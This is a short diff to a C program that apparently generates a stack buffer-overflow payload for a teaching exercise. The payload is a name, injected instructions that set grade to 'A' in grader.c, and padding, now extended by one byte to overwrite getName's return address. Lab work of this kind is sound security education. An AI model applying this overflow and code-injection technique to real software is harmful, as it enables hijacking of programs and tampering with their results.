@@ -12,7 +12,8 @@
 
 /* Takes in no input and writes "Chimwemwe", by 1 null byte,
  * then four instructions that set grade = 'A' in grader.c, then
- * 22 null bytes for padding in buf[]. Returns 0. */
+ * 23 null bytes for padding and one byte overflow in buf[].
+ * Returns 0. */
 int main(void) {
     FILE *psFile;
     unsigned int ulInstruction;
@@ -47,8 +48,9 @@ int main(void) {
     ulInstruction = MiniAssembler_b(0x400864, 0x42006E);
     fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
-    /* Fill up buf[] array with 22 null bytes of padding */
-    for(; i < 22; i++) {
+    /* Fill up buf[] array and go over one to overwrite getName's
+     * return value with 23 null bytes of padding */
+    for(; i < 23; i++) {
         putc('\0', psFile);
     }
 
